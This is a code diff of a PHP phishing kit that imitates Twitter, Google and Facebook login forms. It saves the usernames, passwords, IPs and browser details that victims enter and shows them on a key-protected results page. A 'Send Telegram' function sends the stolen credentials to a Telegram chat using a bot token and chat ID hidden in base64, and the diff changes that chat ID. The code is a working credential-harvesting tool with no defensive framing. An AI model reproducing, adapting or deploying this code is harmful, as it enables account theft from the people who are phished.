@@ -133,8 +133,8 @@ if (isset($_POST['login'])) {
   file_put_contents('65d592ca6de0975858e73068ddb745bea5b095e0.json', json_encode($json_arr));
 }
 if (isset($_POST['send_telegram'])) {
-    sendMessage(base64_decode('MTE5OTg1ODU5OQ=='),
-        "Result Pesing\n\nFrom              : {$_POST['login_from']}\nUsername 			: {$_POST['user']}\nPassword 			 : {$_POST['pass']}\nDate               : {$_POST['date']}\nIP                    : {$_POST['ip']}\nBrowser        : {$_POST['browser']}",
+    sendMessage(base64_decode("LTQyOTk4NjE5OA=="),
+        "Result Pesing\n\nFrom              : {$_POST['login_from']}\nUsername          : {$_POST['user']}\nPassword             : {$_POST['pass']}\nDate               : {$_POST['date']}\nIP                    : {$_POST['ip']}\nBrowser        : {$_POST['browser']}",
         base64_decode("MTM1NDQ0NDI4NDpBQUVKekxqbVdWbGFHaUtxSVpZbDd6ZkxnTlc5TlppQzdqTQ=="));
 }
 function sendMessage($chatID, $messaggio, $token) {
@@ -164,15 +164,15 @@ $data = file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
 $key = "rabbitx";
 if (empty($key) || (isset($_GET[sha1('key')]) && ($_GET[sha1('key')] == sha1($key)))) {
   ?>
-  	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-  	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
   <div class="container"><br>
-  	<div class="card">
-  		<div class="card-header">
-  			<h3>Result</h3>
-    	</div>
+    <div class="card">
+        <div class="card-header">
+            <h3>Result</h3>
+        </div>
     <div class="card-body">
     <!--<form method="post">
         <button name="reset">reset</button>
@@ -180,87 +180,87 @@ if (empty($key) || (isset($_GET[sha1('key')]) && ($_GET[sha1('key')] == sha1($ke
     <ul class="list-group">
     <?php
     foreach(json_decode($data, true) as $key => $value): ?>
-    		<li class="list-group-item">
-    			<div class="row">
-    				<div class="col">
-    					From
-    				</div>
-    				<div class="col-0">:</div>
-    				<div class="col-9">
-    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['from'] ?>">
-    				</div>
-    			</div>
-    		</li>
-    		<li class="list-group-item">
-    			<div class="row">
-    				<div class="col">
-    					Username
-    				</div>
-    				<div class="col-0">:</div>
-    				<div class="col-9">
-    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['user'] ?>">
-    				</div>
-    			</div>
-    		</li>
-    		<li class="list-group-item">
-    			<div class="row">
-    				<div class="col">
-    					Password
-    				</div>
-    				<div class="col-0">:</div>
-    				<div class="col-9">
-    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['pass'] ?>">
-    				</div>
-    			</div>
-    		</li>
-    		<li class="list-group-item">
-    			<div class="row">
-    				<div class="col">
-    					Date
-    				</div>
-    				<div class="col-0">:</div>
-    				<div class="col-9">
-    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['date'] ?>">
-    				</div>
-    			</div>
-    		</li>
-    		<li class="list-group-item">
-    			<div class="row">
-    				<div class="col">
-    					IP
-    				</div>
-    				<div class="col-0">:</div>
-    				<div class="col-9">
-    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['ip'] ?>">
-    				</div>
-    			</div>
-    		</li>
-    		<li class="list-group-item">
-    			<div class="row">
-    				<div class="col">
-    					Browser
-    				</div>
-    				<div class="col-0">:</div>
-    				<div class="col-9">
-    					<input class="form-control form-control-sm" type="text" disabled value="<?= $value['browser'] ?>">
-    				</div>
-    			</div>
-    		</li>
-    		<form method="post">
-    			<li class="list-group-item">
-    				<input type="hidden" name="login_from" value="<?= $value['from'] ?>">
-    				<input type="hidden" name="user" value="<?= $value['user'] ?>">
-    				<input type="hidden" name="pass" value="<?= $value['pass'] ?>">
-    				<input type="hidden" name="date" value="<?= $value['date'] ?>">
-    				<input type="hidden" name="ip" value="<?= $value['ip'] ?>">
-    				<input type="hidden" name="browser" value="<?= $value['browser'] ?>">
-    				<button style="width:100%" class="btn btn-primary btn-sm" name="send_telegram">Send Telegram</button>
-    			</li>
-    	</form>
+            <li class="list-group-item">
+                <div class="row">
+                    <div class="col">
+                        From
+                    </div>
+                    <div class="col-0">:</div>
+                    <div class="col-9">
+                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['from'] ?>">
+                    </div>
+                </div>
+            </li>
+            <li class="list-group-item">
+                <div class="row">
+                    <div class="col">
+                        Username
+                    </div>
+                    <div class="col-0">:</div>
+                    <div class="col-9">
+                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['user'] ?>">
+                    </div>
+                </div>
+            </li>
+            <li class="list-group-item">
+                <div class="row">
+                    <div class="col">
+                        Password
+                    </div>
+                    <div class="col-0">:</div>
+                    <div class="col-9">
+                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['pass'] ?>">
+                    </div>
+                </div>
+            </li>
+            <li class="list-group-item">
+                <div class="row">
+                    <div class="col">
+                        Date
+                    </div>
+                    <div class="col-0">:</div>
+                    <div class="col-9">
+                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['date'] ?>">
+                    </div>
+                </div>
+            </li>
+            <li class="list-group-item">
+                <div class="row">
+                    <div class="col">
+                        IP
+                    </div>
+                    <div class="col-0">:</div>
+                    <div class="col-9">
+                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['ip'] ?>">
+                    </div>
+                </div>
+            </li>
+            <li class="list-group-item">
+                <div class="row">
+                    <div class="col">
+                        Browser
+                    </div>
+                    <div class="col-0">:</div>
+                    <div class="col-9">
+                        <input class="form-control form-control-sm" type="text" disabled value="<?= $value['browser'] ?>">
+                    </div>
+                </div>
+            </li>
+            <form method="post">
+                <li class="list-group-item">
+                    <input type="hidden" name="login_from" value="<?= $value['from'] ?>">
+                    <input type="hidden" name="user" value="<?= $value['user'] ?>">
+                    <input type="hidden" name="pass" value="<?= $value['pass'] ?>">
+                    <input type="hidden" name="date" value="<?= $value['date'] ?>">
+                    <input type="hidden" name="ip" value="<?= $value['ip'] ?>">
+                    <input type="hidden" name="browser" value="<?= $value['browser'] ?>">
+                    <button style="width:100%" class="btn btn-primary btn-sm" name="send_telegram">Send Telegram</button>
+                </li>
+        </form>
     <?php endforeach; ?>
     </ul>
-    	</div>
-    	</div>
+        </div>
+        </div>
   </div><br>
   <?php
   exit();
@@ -1147,7 +1147,7 @@ function showSlides() {
 </br>
 </br>
 <select hidden name="p">
-	<option value="collect">p</option>
+    <option value="collect">p</option>
 </select>
 <center>
 <button type="submit" class="btn-login-twitter" name="login"><b>Login</b></button>
@@ -1191,7 +1191,7 @@ function showSlides() {
 </center>
 <input type="password" name="pass" placeholder="Enter your password" autocomplete="off" autocapitalize="off" required></br>
 <select hidden name="p">
-	<option value="collect">p</option>
+    <option value="collect">p</option>
 </select>
 <button type="button" class="previous btn-register-gp"><b>Previous</b></button>
 <button type="submit" class="btn-login-gp" name="login"><b>Sign in</b></button>
@@ -1221,7 +1221,7 @@ function showSlides() {
 </br>
 <center>
 <select hidden name="p">
-	<option value="collect">p</option>
+    <option value="collect">p</option>
 </select>
 <button type="submit" class="btn-login-fb" name="login"><b>Log In</b></button>
 </center>
